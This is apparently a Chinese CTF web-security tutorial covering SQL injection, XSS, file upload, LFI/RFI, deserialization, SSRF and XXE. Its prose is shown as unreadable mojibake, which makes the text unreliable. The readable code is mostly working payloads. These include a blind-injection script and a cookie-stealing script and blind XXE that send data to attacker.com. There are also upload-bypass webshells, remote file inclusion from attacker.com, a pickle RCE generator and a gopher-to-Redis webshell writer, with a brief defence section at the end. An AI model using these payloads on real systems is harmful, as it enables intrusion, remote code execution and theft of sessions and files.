---
title: 'CTF Web æŒ‘æˆ˜è§£æï¼šä»å…¥é—¨åˆ°è¿›é˜¶'
date: '2024-02-10'
excerpt: 'æ·±å…¥è§£æ CTF Web å®‰å…¨æŒ‘æˆ˜çš„å¸¸è§é¢˜å‹ã€è§£é¢˜æ€è·¯å’ŒæŠ€å·§ï¼ŒåŒ…å« SQL æ³¨å…¥ã€XSSã€æ–‡ä»¶ä¸Šä¼ ç­‰ç»å…¸æ¼æ´çš„åˆ©ç”¨æ–¹æ³•ã€‚'
category: 'ctf'
---

CTFï¼ˆCapture The Flagï¼‰æ˜¯ç½‘ç»œå®‰å…¨é¢†åŸŸçš„ç«æŠ€æ¯”èµ›ï¼ŒWeb æ–¹å‘çš„æŒ‘æˆ˜æ¶µç›–äº†å„ç§ Web å®‰å…¨æ¼æ´çš„åˆ©ç”¨ã€‚é€šè¿‡å®æˆ˜æ¼”ç»ƒï¼Œæˆ‘ä»¬å¯ä»¥æ·±å…¥ç†è§£å®‰å…¨æ¼æ´çš„åŸç†å’Œé˜²æŠ¤æ–¹æ³•ã€‚

## CTF Web åŸºç¡€çŸ¥è¯†

### å¸¸è§é¢˜å‹åˆ†ç±»
1. **SQL æ³¨å…¥**ï¼šæ•°æ®åº“æŸ¥è¯¢æ¼æ´åˆ©ç”¨
2. **XSS**ï¼šè·¨ç«™è„šæœ¬æ”»å‡»
3. **æ–‡ä»¶ä¸Šä¼ **ï¼šç»•è¿‡æ–‡ä»¶ä¸Šä¼ é™åˆ¶
4. **æ–‡ä»¶åŒ…å«**ï¼šæœ¬åœ°/è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´
5. **ä»£ç å®¡è®¡**ï¼šæºç åˆ†ææ‰¾æ¼æ´
6. **ååºåˆ—åŒ–**ï¼šå¯¹è±¡åºåˆ—åŒ–æ¼æ´
7. **SSRF**ï¼šæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ 
8. **XXE**ï¼šXML å¤–éƒ¨å®ä½“æ³¨å…¥

### åŸºç¡€å·¥å…·å‡†å¤‡
```bash
# å¿…å¤‡å·¥å…·
- Burp Suiteï¼šWeb åº”ç”¨å®‰å…¨æµ‹è¯•
- sqlmapï¼šè‡ªåŠ¨åŒ– SQL æ³¨å…¥å·¥å…·
- dirsearchï¼šç›®å½•æ‰«æå·¥å…·
- Postmanï¼šAPI æµ‹è¯•å·¥å…·
- æµè§ˆå™¨å¼€å‘è€…å·¥å…·

# åœ¨çº¿å·¥å…·
- CyberChefï¼šæ•°æ®å¤„ç†å’Œç¼–ç è½¬æ¢
- Hackvertorï¼šç¼–ç è½¬æ¢å’Œç»•è¿‡
- RegExrï¼šæ­£åˆ™è¡¨è¾¾å¼æµ‹è¯•
```

## SQL æ³¨å…¥æŒ‘æˆ˜è§£æ

### ç»å…¸è”åˆæŸ¥è¯¢æ³¨å…¥

```php
<?php
// å­˜åœ¨æ¼æ´çš„ä»£ç 
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";
$result = mysql_query($sql);
?>
```

**è§£é¢˜æ­¥éª¤ï¼š**

```sql
-- 1. åˆ¤æ–­æ³¨å…¥ç‚¹
http://target.com/user.php?id=1' AND 1=1 --+
http://target.com/user.php?id=1' AND 1=2 --+

-- 2. åˆ¤æ–­å­—æ®µæ•°
http://target.com/user.php?id=1' ORDER BY 3 --+
http://target.com/user.php?id=1' ORDER BY 4 --+ (æŠ¥é”™ï¼Œè¯´æ˜æœ‰3ä¸ªå­—æ®µ)

-- 3. ç¡®å®šæ˜¾ç¤ºä½
http://target.com/user.php?id=-1' UNION SELECT 1,2,3 --+

-- 4. è·å–æ•°æ®åº“ä¿¡æ¯
http://target.com/user.php?id=-1' UNION SELECT 1,database(),version() --+

-- 5. è·å–è¡¨å
http://target.com/user.php?id=-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() --+

-- 6. è·å–åˆ—å
http://target.com/user.php?id=-1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='flag' --+

-- 7. è·å–æ•°æ®
http://target.com/user.php?id=-1' UNION SELECT 1,flag,3 FROM flag --+
```

### ç›²æ³¨æŠ€å·§

```python
# å¸ƒå°”ç›²æ³¨è„šæœ¬ç¤ºä¾‹
import requests
import string

def boolean_blind_sqli(url, payload_template):
    result = ""
    
    for i in range(1, 50):  # å‡è®¾flagé•¿åº¦ä¸è¶…è¿‡50
        for char in string.printable:
            # æ„é€ payload
            payload = payload_template.format(position=i, char=ord(char))
            
            response = requests.get(url + payload)
            
            # æ ¹æ®é¡µé¢å“åº”åˆ¤æ–­
            if "Welcome" in response.text:  # æ­£ç¡®æ—¶çš„æ ‡å¿—
                result += char
                print(f"Found: {result}")
                break
        else:
            break  # æ²¡æ‰¾åˆ°å­—ç¬¦ï¼Œç»“æŸ
    
    return result

# ä½¿ç”¨ç¤ºä¾‹
url = "http://target.com/login.php?username=admin' AND ascii(substr((SELECT flag FROM flag),{position},1))={char} --+"
flag = boolean_blind_sqli(url, "admin' AND ascii(substr((SELECT flag FROM flag),{position},1))={char} --+")
```

### æ—¶é—´ç›²æ³¨

```sql
-- æ—¶é—´ç›²æ³¨payload
admin' AND IF(ascii(substr((SELECT flag FROM flag),1,1))=102, sleep(5), 0) --+

-- å¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯'f'(ascii=102)ï¼Œé¡µé¢ä¼šå»¶è¿Ÿ5ç§’å“åº”
```

## XSS æŒ‘æˆ˜è§£æ

### åå°„å‹ XSS

```php
<?php
// å­˜åœ¨æ¼æ´çš„æœç´¢é¡µé¢
$search = $_GET['search'];
echo "æœç´¢ç»“æœï¼š" . $search;
?>
```

**åŸºç¡€ Payloadï¼š**
```javascript
// ç®€å•å¼¹çª—
<script>alert('XSS')</script>

// ç»•è¿‡è¿‡æ»¤
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
```

**é«˜çº§ç»•è¿‡æŠ€å·§ï¼š**
```javascript
// å¤§å°å†™ç»•è¿‡
<ScRiPt>alert('XSS')</ScRiPt>

// ç¼–ç ç»•è¿‡
<script>alert(String.fromCharCode(88,83,83))</script>

// äº‹ä»¶å¤„ç†ç»•è¿‡
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus><option>test</option></select>

// æ— æ‹¬å·ç»•è¿‡
<script>alert`XSS`</script>
<script>eval.call`${'alert\x28\x27XSS\x27\x29'}`</script>
```

### å­˜å‚¨å‹ XSS

```html
<!-- ç•™è¨€æ¿åœºæ™¯ -->
<form method="POST">
    <textarea name="message"></textarea>
    <input type="submit" value="æäº¤ç•™è¨€">
</form>

<!-- æ¶æ„payload -->
<script>
// è·å–cookie
document.location='http://attacker.com/steal.php?cookie='+document.cookie;

// è·å–é¡µé¢å†…å®¹
fetch('http://attacker.com/steal.php', {
    method: 'POST',
    body: document.documentElement.innerHTML
});
</script>
```

### DOM XSS

```javascript
// å­˜åœ¨æ¼æ´çš„JavaScriptä»£ç 
function showWelcome() {
    var name = location.hash.substr(1);
    document.getElementById('welcome').innerHTML = 'Welcome ' + name;
}

// åˆ©ç”¨payload
http://target.com/page.html#<img src=x onerror=alert('XSS')>
```

## æ–‡ä»¶ä¸Šä¼ æŒ‘æˆ˜

### ç»•è¿‡æ–‡ä»¶ç±»å‹æ£€æŸ¥

```php
<?php
// å‰ç«¯æ£€æŸ¥ç»•è¿‡
// ä¿®æ”¹æ–‡ä»¶æ‰©å±•åï¼šshell.php -> shell.jpg
// ç„¶åç”¨Burp Suiteæ‹¦æˆªè¯·æ±‚ï¼Œæ”¹å›.php

// åç«¯MIMEç±»å‹æ£€æŸ¥ç»•è¿‡
// Content-Type: image/jpeg
// ä½†æ–‡ä»¶å†…å®¹æ˜¯PHPä»£ç 

// æ–‡ä»¶å¤´æ£€æŸ¥ç»•è¿‡
// åœ¨PHPä»£ç å‰æ·»åŠ å›¾ç‰‡æ–‡ä»¶å¤´
GIF89a
<?php eval($_POST['cmd']); ?>
?>
```

### åŒé‡æ‰©å±•åç»•è¿‡

```bash
# Apacheè§£ææ¼æ´
shell.php.jpg  # å¯èƒ½è¢«è§£æä¸ºPHPæ–‡ä»¶

# IISè§£ææ¼æ´
shell.asp;.jpg  # åˆ†å·åçš„å†…å®¹è¢«å¿½ç•¥
```

### .htaccess ç»•è¿‡

```apache
# ä¸Šä¼ .htaccessæ–‡ä»¶
<FilesMatch "shell.jpg">
SetHandler application/x-httpd-php
</FilesMatch>

# ç„¶åä¸Šä¼ shell.jpgï¼ˆå†…å®¹æ˜¯PHPä»£ç ï¼‰
```

## æ–‡ä»¶åŒ…å«æ¼æ´

### æœ¬åœ°æ–‡ä»¶åŒ…å« (LFI)

```php
<?php
// å­˜åœ¨æ¼æ´çš„ä»£ç 
$page = $_GET['page'];
include($page . '.php');
?>
```

**åˆ©ç”¨æ–¹æ³•ï¼š**
```bash
# è¯»å–æ•æ„Ÿæ–‡ä»¶
?page=../../../etc/passwd
?page=../../../var/log/apache2/access.log

# ç›®å½•éå†
?page=....//....//....//etc/passwd

# NULLå­—èŠ‚ç»•è¿‡ï¼ˆPHP < 5.3.4ï¼‰
?page=../../../etc/passwd%00

# ä¼ªåè®®åˆ©ç”¨
?page=php://filter/read=convert.base64-encode/resource=index.php
?page=data://text/plain,<?php phpinfo();?>
?page=php://input  # POSTæ•°æ®ï¼š<?php system($_GET['cmd']);?>
```

### è¿œç¨‹æ–‡ä»¶åŒ…å« (RFI)

```php
<?php
// allow_url_include = On æ—¶å¯åˆ©ç”¨
include($_GET['file']);
?>
```

```bash
# è¿œç¨‹åŒ…å«æ¶æ„æ–‡ä»¶
?file=http://attacker.com/shell.txt

# shell.txtå†…å®¹ï¼š
<?php system($_GET['cmd']); ?>
```

## ä»£ç å®¡è®¡æŒ‘æˆ˜

### PHP ä»£ç å®¡è®¡ç¤ºä¾‹

```php
<?php
// é¢˜ç›®ä»£ç 
class User {
    public $username;
    public $password;
    
    public function __construct($username, $password) {
        $this->username = $username;
        $this->password = $password;
    }
    
    public function login() {
        if ($this->username === 'admin' && $this->password === 'admin123') {
            return true;
        }
        return false;
    }
    
    public function __toString() {
        return file_get_contents($this->username);
    }
}

$user_data = $_GET['data'];
$user = unserialize($user_data);
echo $user;
?>
```

**æ¼æ´åˆ†æï¼š**
1. å­˜åœ¨ååºåˆ—åŒ–æ¼æ´
2. `__toString` æ–¹æ³•å¯ä»¥è¯»å–ä»»æ„æ–‡ä»¶
3. å½“å¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶ä¼šè§¦å‘ `__toString`

**åˆ©ç”¨ Payloadï¼š**
```php
<?php
class User {
    public $username = '/flag.txt';  // è¦è¯»å–çš„æ–‡ä»¶
    public $password = '';
}

$payload = serialize(new User());
echo urlencode($payload);
// è¾“å‡ºï¼šO%3A4%3A%22User%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A9%3A%22%2Fflag.txt%22%3Bs%3A8%3A%22password%22%3Bs%3A0%3A%22%22%3B%7D
?>
```

### Python ä»£ç å®¡è®¡

```python
# Flaskåº”ç”¨æ¼æ´ç¤ºä¾‹
from flask import Flask, request
import pickle
import base64

app = Flask(__name__)

@app.route('/data', methods=['POST'])
def handle_data():
    data = request.form.get('data')
    # å±é™©çš„ååºåˆ—åŒ–
    obj = pickle.loads(base64.b64decode(data))
    return str(obj)

if __name__ == '__main__':
    app.run(debug=True)
```

**åˆ©ç”¨æ–¹æ³•ï¼š**
```python
import pickle
import base64
import os

# æ¶æ„ç±»
class RCE:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))

# ç”Ÿæˆpayload
payload = base64.b64encode(pickle.dumps(RCE()))
print(payload.decode())
```

## SSRF æŒ‘æˆ˜

### åŸºç¡€ SSRF

```php
<?php
// å­˜åœ¨SSRFæ¼æ´çš„ä»£ç 
$url = $_GET['url'];
$content = file_get_contents($url);
echo $content;
?>
```

**åˆ©ç”¨æ–¹æ³•ï¼š**
```bash
# è¯»å–å†…ç½‘æ–‡ä»¶
?url=file:///etc/passwd
?url=file:///flag.txt

# è®¿é—®å†…ç½‘æœåŠ¡
?url=http://127.0.0.1:22
?url=http://192.168.1.1/admin

# ç«¯å£æ‰«æ
?url=http://127.0.0.1:3306  # MySQL
?url=http://127.0.0.1:6379  # Redis
```

### ç»•è¿‡è¿‡æ»¤

```bash
# IPåœ°å€ç»•è¿‡
127.0.0.1 -> 127.1 -> 0x7f000001 -> 2130706433

# åŸŸåç»•è¿‡
localhost -> 127.0.0.1.xip.io

# åè®®ç»•è¿‡
http://example.com -> gopher://example.com
```

### Gopher åè®®åˆ©ç”¨

```python
# åˆ©ç”¨Gopheråè®®æ“ä½œRedis
import urllib.parse

# Rediså‘½ä»¤
commands = [
    "FLUSHALL",
    "SET 1 '<?php eval($_POST[cmd]);?>'",
    "CONFIG SET dir /var/www/html",
    "CONFIG SET dbfilename shell.php",
    "SAVE"
]

# æ„é€ Gopher payload
payload = ""
for cmd in commands:
    payload += cmd + "\r\n"

gopher_url = "gopher://127.0.0.1:6379/_" + urllib.parse.quote(payload)
print(gopher_url)
```

## XXE æ³¨å…¥

### åŸºç¡€ XXE

```xml
<!-- å­˜åœ¨æ¼æ´çš„XMLå¤„ç† -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <data>&xxe;</data>
</root>
```

### ç›² XXE

```xml
<!-- å¤–éƒ¨DTDæ–‡ä»¶ -->
<!ENTITY % file SYSTEM "file:///flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfiltrate;
```

```xml
<!-- ä¸»XMLæ–‡ä»¶ -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
%remote;
]>
<root></root>
```

## å®æˆ˜è§£é¢˜æŠ€å·§

### ä¿¡æ¯æ”¶é›†

```bash
# ç›®å½•æ‰«æ
dirsearch -u http://target.com -e php,html,js,txt

# å­åŸŸåæšä¸¾
subfinder -d target.com

# ç«¯å£æ‰«æ
nmap -sV -sC target.com

# æŠ€æœ¯æ ˆè¯†åˆ«
whatweb http://target.com
```

### Burp Suite ä½¿ç”¨æŠ€å·§

```javascript
// Intruderæ¨¡å—è¿›è¡Œçˆ†ç ´
// Repeateræ¨¡å—æµ‹è¯•payload
// Proxyæ¨¡å—æ‹¦æˆªä¿®æ”¹è¯·æ±‚

// å¸¸ç”¨æ’ä»¶
- Autorizeï¼šæƒé™æµ‹è¯•
- J2EEScanï¼šJavaåº”ç”¨æ‰«æ
- SQLiPyï¼šSQLæ³¨å…¥æ£€æµ‹
```

### ç¼–ç è§£ç æŠ€å·§

```python
# å¸¸è§ç¼–ç è½¬æ¢
import base64
import urllib.parse
import html

# Base64ç¼–ç 
payload = base64.b64encode(b"<script>alert('XSS')</script>").decode()

# URLç¼–ç 
payload = urllib.parse.quote("<script>alert('XSS')</script>")

# HTMLå®ä½“ç¼–ç 
payload = html.escape("<script>alert('XSS')</script>")

# åå…­è¿›åˆ¶ç¼–ç 
payload = "".join([hex(ord(c))[2:] for c in "<script>alert('XSS')</script>"])
```

## é˜²æŠ¤ä¸ä¿®å¤

### è¾“å…¥éªŒè¯

```php
<?php
// å®‰å…¨çš„è¾“å…¥å¤„ç†
function sanitize_input($input) {
    // å»é™¤HTMLæ ‡ç­¾
    $input = strip_tags($input);
    
    // HTMLå®ä½“ç¼–ç 
    $input = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
    
    // é•¿åº¦é™åˆ¶
    $input = substr($input, 0, 100);
    
    return $input;
}

// å‚æ•°åŒ–æŸ¥è¯¢é˜²æ­¢SQLæ³¨å…¥
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$user_id]);
?>
```

### æ–‡ä»¶ä¸Šä¼ å®‰å…¨

```php
<?php
function secure_upload($file) {
    // æ£€æŸ¥æ–‡ä»¶ç±»å‹
    $allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
    if (!in_array($file['type'], $allowed_types)) {
        return false;
    }
    
    // æ£€æŸ¥æ–‡ä»¶å¤§å°
    if ($file['size'] > 1024 * 1024) { // 1MB
        return false;
    }
    
    // é‡å‘½åæ–‡ä»¶
    $filename = uniqid() . '.jpg';
    
    // ç§»åŠ¨åˆ°å®‰å…¨ç›®å½•
    move_uploaded_file($file['tmp_name'], '/uploads/' . $filename);
    
    return $filename;
}
?>
```

## å­¦ä¹ èµ„æºæ¨è

### åœ¨çº¿ç»ƒä¹ å¹³å°
- **DVWA**ï¼šWebåº”ç”¨æ¼æ´ç»ƒä¹ 
- **WebGoat**ï¼šOWASPå®‰å…¨æ•™å­¦å¹³å°
- **Portswigger Web Security Academy**ï¼šå…è´¹Webå®‰å…¨è¯¾ç¨‹
- **HackTheBox**ï¼šå®æˆ˜æ¸—é€æµ‹è¯•å¹³å°
- **TryHackMe**ï¼šå¾ªåºæ¸è¿›çš„å®‰å…¨å­¦ä¹ 

### CTFå¹³å°
- **CTFHub**ï¼šä¸­æ–‡CTFç»ƒä¹ å¹³å°
- **BugKu**ï¼šå›½å†…çŸ¥åCTFå¹³å°
- **PicoCTF**ï¼šé€‚åˆåˆå­¦è€…çš„CTF
- **OverTheWire**ï¼šç»å…¸çš„Wargameå¹³å°

## æ€»ç»“

CTF Web æŒ‘æˆ˜æ˜¯å­¦ä¹  Web å®‰å…¨çš„æœ€ä½³é€”å¾„ä¹‹ä¸€ã€‚é€šè¿‡å®æˆ˜ç»ƒä¹ ï¼Œæˆ‘ä»¬å¯ä»¥ï¼š

1. **æ·±å…¥ç†è§£æ¼æ´åŸç†**ï¼šä¸ä»…çŸ¥é“å¦‚ä½•åˆ©ç”¨ï¼Œæ›´è¦ç†è§£ä¸ºä»€ä¹ˆå­˜åœ¨
2. **æå‡å®‰å…¨æ„è¯†**ï¼šä»æ”»å‡»è€…è§’åº¦æ€è€ƒé˜²æŠ¤
3. **æŒæ¡å®ç”¨æŠ€èƒ½**ï¼šå­¦ä¼šä½¿ç”¨å„ç§å®‰å…¨å·¥å…·
4. **åŸ¹å…»é€»è¾‘æ€ç»´**ï¼šè§£é¢˜è¿‡ç¨‹é”»ç‚¼åˆ†æèƒ½åŠ›

è®°ä½ï¼Œå­¦ä¹ å®‰å…¨æŠ€æœ¯çš„ç›®çš„æ˜¯ä¸ºäº†æ›´å¥½åœ°é˜²æŠ¤ï¼Œè€Œä¸æ˜¯æ¶æ„æ”»å‡»ã€‚åœ¨åˆæ³•åˆè§„çš„å‰æä¸‹ï¼Œé€šè¿‡ CTF æŒ‘æˆ˜æå‡è‡ªå·±çš„å®‰å…¨æŠ€èƒ½ï¼Œä¸ºæ„å»ºæ›´å®‰å…¨çš„ç½‘ç»œç¯å¢ƒè´¡çŒ®åŠ›é‡ã€‚

> "åœ¨ç½‘ç»œå®‰å…¨çš„ä¸–ç•Œé‡Œï¼Œæ¯ä¸€ä¸ªæ¼æ´éƒ½æ˜¯ä¸€é¦–å¾…è§£çš„å¯†ç è¯—ï¼Œæ¯ä¸€æ¬¡æˆåŠŸçš„é˜²æŠ¤éƒ½æ˜¯å¯¹æ•°å­—ä¸–ç•Œçš„å®ˆæŠ¤ã€‚"

---

*æ„¿æ‰€æœ‰çš„å®‰å…¨ç ”ç©¶è€…éƒ½èƒ½åœ¨æŒ‘æˆ˜ä¸­æˆé•¿ï¼Œåœ¨å®ˆæŠ¤ä¸­å‰è¡Œã€‚Keep Learning, Keep Securing! ğŸ›¡ï¸*